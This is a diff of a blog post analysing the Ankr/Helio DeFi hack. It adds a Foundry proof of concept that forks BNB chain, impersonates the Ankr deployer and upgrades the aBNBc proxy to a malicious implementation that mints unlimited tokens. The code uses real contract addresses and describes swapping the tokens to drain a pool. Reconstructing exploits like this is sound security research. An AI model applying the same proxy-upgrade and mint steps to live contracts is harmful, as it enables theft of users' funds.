@@ -136,14 +136,60 @@ The final step was to simply borrow against the bad collateral at a highly infla
 ### Proof of Concept
 Now that we understand the Ankr attacker's malicious implementation contract and steps involved in attacking Helio, we can formulate our own proof of concept (PoC) to exploit both protocols using Foundry. We will impersonate the Ankr admin deployer to simulate key compromise, upgrade the aBNBc contract and profit.
 
-We’ll start by selecting an RPC provider with archive access. For this demonstration, it seems only fitting to use the free public RPC aggregator provided by Ankr. We select the block number `23545400` as our fork block, 1 block before the first hack transaction.
+We’ll start by selecting an RPC provider with archive access. For this demonstration, it seems only fitting to use the free public RPC aggregator provided by Ankr. Our `foundry.toml` file will look something like this:
+
+```toml
+[profile.default]
+src = 'src'
+out = 'out'
+libs = ['lib']
+
+rpc_storage_caching = { chains = ["bsc"], endpoints = "all" }
+
+[rpc_endpoints]
+bsc = "https://rpc.ankr.com/bsc"
+```
+
+We select the block number `23545400` as our fork block, 1 block before the first hack transaction. This can be achieved by using the following `setUp` function, which also utilizes the forge standard library function `makeAddr` to create labelled addresses for the contracts we will be interacting with:
+
+```solidity
+function setUp() public {
+    vm.createSelectFork("bsc", 23545400);
+
+    ANKR_EXPLOITER = makeAddr("Ankr Exploiter");
+    HELIO_EXPLOITER = makeAddr("Helio Exploiter");
+    evilImpl = new EvilImplementation();
+}
+```
 
 ### The Attack
-Let’s begin by creating our Exploit test contract. We deploy the malicious implementation contract and then call `ProxyAdmin::upgrade`, passing the target proxy address and address of the malicious implementation contract as arguments. This will upgrade the proxy to the malicious implementation contract which will allow us to mint an unlimited number of aBNBc tokens.
+Let’s begin by creating our Exploit test contract. First, it is helpful to define constants for all the relevant contract addresses with which we will be interacting, for example:
 
-Now that our malicious implementation is in place, simply calling the evil mint function on the proxy will mint an unlimited number of tokens which we can then sell for a profit. We'll interface with the PankcakeSwap router to swap our tokens for USDC via wBNB, draining the liquidity pool in the process.
+```solidity
+address public constant ANKR_DEPLOYER = 0x2Ffc59d32A524611Bb891cab759112A51f9e33C0;
+    address public constant ANKR_PROXY_ADMIN = 0x1bD5dF997c8612652886723406131F582ab93DEf;
+    address public constant ABNBC_PROXY = 0xE85aFCcDaFBE7F2B096f268e31ccE3da8dA2990A;
+```
 
-If we run this PoC against the forked block number, using `vm.createSelectFork("bsc", 23545400);` in the `setUp` function, we will get the following output:
+We deploy the malicious implementation contract by including the `setUp` function snippet above and then call `ProxyAdmin::upgrade`, passing the target proxy address and address of the malicious implementation contract as arguments. This will upgrade the proxy to the malicious implementation contract which will allow us to mint an unlimited number of aBNBc tokens.
+
+```solidity
+function testExploit() public {
+    // simulate compromised Ankr admin deployer private key
+    vm.startPrank(ANKR_DEPLOYER);
+
+    // upgrade to evil implementation
+    ProxyAdmin(ANKR_PROXY_ADMIN).upgrade(ABNBC_PROXY, address(evilImpl));
+
+    // mint tokens to the exploiter
+    changePrank(ANKR_DEPLOYER);
+    EvilImplementation(ABNBC_PROXY).evilMint(ANKR_EXPLOITER, EXPLOIT_AMOUNT);
+}
+```
+
+Now that our malicious implementation is in place, simply calling the evil mint function on the proxy will mint an unlimited number of tokens which we can then sell for a profit. We'll interface with the PankcakeSwap router to swap our tokens for USDC via wBNB, draining the liquidity pool in the process which can be seen in the full test exploit below.
+
+If we run this PoC against the forked block number, we will get the following output:
 
 ```
 aBNBc minted: 10000000000000000000000000000000
@@ -166,7 +212,7 @@ The Ankr exploit was an unfortunate hack which had even more severe secondary ef
 
 It should be noted that a recovery fund has been coordinated to compensate affected users and cover bad Helio debt, as described in this [blog post](https://www.ankr.com/blog/ankr-makes-progress-with-recovery-program-targets-and-milestones/).
 
-This is what our entire PoC looks like, with the addition of some helpful Foundry logs:
+This is what our entire PoC looks like, with the addition of some helpful Foundry assertions and logs:
 
 ```
 contract Exploit is Test {
